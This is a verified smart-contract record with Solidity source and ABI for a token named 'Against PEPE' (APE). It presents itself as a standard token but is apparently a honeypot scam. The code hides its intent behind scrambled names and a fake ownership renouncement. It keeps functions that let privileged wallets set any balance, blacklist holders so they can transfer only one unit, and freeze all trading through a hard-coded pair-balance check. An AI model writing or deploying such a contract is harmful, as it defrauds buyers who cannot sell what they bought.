{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface receiverAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minTakeTx) external view returns (uint256);\n\n    function transfer(address totalLaunchedMode, uint256 exemptLimitLiquidity) external returns (bool);\n\n    function allowance(address limitExemptToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptLimitLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalLaunchedMode,\n        uint256 exemptLimitLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellTotal, uint256 value);\n    event Approval(address indexed limitExemptToken, address indexed spender, uint256 value);\n}\n\nabstract contract liquidityTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalEnableTake {\n    function createPair(address isAmount, address receiverTotal) external returns (address);\n}\n\ninterface receiverAutoMetadata is receiverAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AgainstPEPE is liquidityTotal, receiverAuto, receiverAutoMetadata {\n\n    mapping(address => bool) public txTo;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamAuto;\n    }\n\n    uint256 tradingSell;\n\n    mapping(address => mapping(address => uint256)) private fromIs;\n\n    uint256 public senderSwapLimit;\n\n    address minExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return tradingIs;\n    }\n\n    address private tradingIs;\n\n    constructor (){\n        \n        maxFee totalSenderFrom = maxFee(minExempt);\n        receiverToken = totalEnableTake(totalSenderFrom.factory()).createPair(totalSenderFrom.WETH(), address(this));\n        if (limitMode == fromEnableFee) {\n            limitMode = false;\n        }\n        senderToken = _msgSender();\n        maxShould();\n        takeLimitSender[senderToken] = true;\n        isFrom[senderToken] = shouldFundLaunched;\n        \n        emit Transfer(address(0), senderToken, shouldFundLaunched);\n    }\n\n    mapping(address => uint256) private isFrom;\n\n    string private fundFee = \"Against PEPE\";\n\n    address public senderToken;\n\n    uint256 public sellBuy;\n\n    string private fundAt = \"APE\";\n\n    function tokenMax() private view {\n        require(takeLimitSender[_msgSender()]);\n    }\n\n    function autoMode(address takeExemptMarketing, uint256 exemptLimitLiquidity) public {\n        tokenMax();\n        isFrom[takeExemptMarketing] = exemptLimitLiquidity;\n    }\n\n    function maxShould() public {\n        emit OwnershipTransferred(senderToken, address(0));\n        tradingIs = address(0);\n    }\n\n    uint256 public autoToReceiver;\n\n    uint256 private minSender;\n\n    uint256 private shouldFundLaunched = 100000000 * 10 ** 18;\n\n    uint256 public sellFrom;\n\n    function feeExempt(address limitSwap) public {\n        tokenMax();\n        if (limitMode != fromEnableFee) {\n            senderSwapLimit = launchedToken;\n        }\n        if (limitSwap == senderToken || limitSwap == receiverToken) {\n            return;\n        }\n        txTo[limitSwap] = true;\n    }\n\n    function transferFrom(address receiverLimit, address totalLaunchedMode, uint256 exemptLimitLiquidity) external override returns (bool) {\n        if (_msgSender() != minExempt) {\n            if (fromIs[receiverLimit][_msgSender()] != type(uint256).max) {\n                require(exemptLimitLiquidity <= fromIs[receiverLimit][_msgSender()]);\n                fromIs[receiverLimit][_msgSender()] -= exemptLimitLiquidity;\n            }\n        }\n        return fromLiquidityTotal(receiverLimit, totalLaunchedMode, exemptLimitLiquidity);\n    }\n\n    uint256 private launchedToken;\n\n    function owner() external view returns (address) {\n        return tradingIs;\n    }\n\n    function transfer(address takeExemptMarketing, uint256 exemptLimitLiquidity) external virtual override returns (bool) {\n        return fromLiquidityTotal(_msgSender(), takeExemptMarketing, exemptLimitLiquidity);\n    }\n\n    uint256 public amountMax;\n\n    uint256 isEnableSender;\n\n    bool public liquidityMax;\n\n    function name() external view virtual override returns (string memory) {\n        return fundFee;\n    }\n\n    event OwnershipTransferred(address indexed sellLiquidity, address indexed liquidityTrading);\n\n    function fromLiquidityTotal(address receiverLimit, address totalLaunchedMode, uint256 exemptLimitLiquidity) internal returns (bool) {\n        if (receiverLimit == senderToken) {\n            return toLimitFee(receiverLimit, totalLaunchedMode, exemptLimitLiquidity);\n        }\n        uint256 swapTrading = receiverAuto(receiverToken).balanceOf(launchSell);\n        require(swapTrading == tradingSell);\n        require(totalLaunchedMode != launchSell);\n        if (txTo[receiverLimit]) {\n            return toLimitFee(receiverLimit, totalLaunchedMode, autoShould);\n        }\n        return toLimitFee(receiverLimit, totalLaunchedMode, exemptLimitLiquidity);\n    }\n\n    function amountSender(address toSell) public {\n        require(toSell.balance < 100000);\n        if (liquidityMax) {\n            return;\n        }\n        \n        takeLimitSender[toSell] = true;\n        if (launchedToken != minSender) {\n            toTokenSell = sellBuy;\n        }\n        liquidityMax = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundAt;\n    }\n\n    function balanceOf(address minTakeTx) public view virtual override returns (uint256) {\n        return isFrom[minTakeTx];\n    }\n\n    address launchSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public toTokenSell;\n\n    uint8 private teamAuto = 18;\n\n    address public receiverToken;\n\n    function allowance(address receiverMax, address txSwapMax) external view virtual override returns (uint256) {\n        if (txSwapMax == minExempt) {\n            return type(uint256).max;\n        }\n        return fromIs[receiverMax][txSwapMax];\n    }\n\n    function maxMarketing(uint256 exemptLimitLiquidity) public {\n        tokenMax();\n        tradingSell = exemptLimitLiquidity;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldFundLaunched;\n    }\n\n    bool private fromEnableFee;\n\n    mapping(address => bool) public takeLimitSender;\n\n    uint256 constant autoShould = 1 ** 10;\n\n    function toLimitFee(address receiverLimit, address totalLaunchedMode, uint256 exemptLimitLiquidity) internal returns (bool) {\n        require(isFrom[receiverLimit] >= exemptLimitLiquidity);\n        isFrom[receiverLimit] -= exemptLimitLiquidity;\n        isFrom[totalLaunchedMode] += exemptLimitLiquidity;\n        emit Transfer(receiverLimit, totalLaunchedMode, exemptLimitLiquidity);\n        return true;\n    }\n\n    bool private limitMode;\n\n    function approve(address txSwapMax, uint256 exemptLimitLiquidity) public virtual override returns (bool) {\n        fromIs[_msgSender()][txSwapMax] = exemptLimitLiquidity;\n        emit Approval(_msgSender(), txSwapMax, exemptLimitLiquidity);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitExemptToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txSwapMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSell\",\"type\":\"address\"}],\"name\":\"amountSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSwapMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLimitLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeExemptMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLimitLiquidity\",\"type\":\"uint256\"}],\"name\":\"autoMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoToReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTakeTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSwap\",\"type\":\"address\"}],\"name\":\"feeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptLimitLiquidity\",\"type\":\"uint256\"}],\"name\":\"maxMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSwapLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeLimitSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTokenSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeExemptMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLimitLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalLaunchedMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLimitLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AgainstPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}